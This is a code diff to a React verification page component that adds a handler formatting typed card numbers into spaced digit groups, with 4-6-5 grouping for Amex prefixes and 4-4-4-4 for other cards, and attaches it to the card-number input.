@@ -29,6 +29,27 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
     return () => clearInterval(timer);
   }, [step, countdown]);
 
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formattedValue = '';
+
+    if (value.startsWith('34') || value.startsWith('37')) {
+      // Amex 4-6-5
+      if (value.length > 0) formattedValue += value.substring(0, 4);
+      if (value.length > 4) formattedValue += ' ' + value.substring(4, 10);
+      if (value.length > 10) formattedValue += ' ' + value.substring(10, 15);
+    } else {
+      // 4-4-4-4 (Visa, Master, Discover)
+      const parts = value.match(/.{1,4}/g);
+      if (parts) {
+        formattedValue = parts.join(' ').substring(0, 19);
+      } else {
+        formattedValue = value;
+      }
+    }
+    setCardNumber(formattedValue);
+  };
+
   const handleNext = () => {
     setLoading(true);
     setTimeout(() => {
@@ -84,7 +105,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
               <input
                 type="text"
                 value={cardNumber}
-                onChange={(e) => setCardNumber(e.target.value)}
+                onChange={handleCardNumberChange}
                 placeholder="Card number"
                 className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
               />
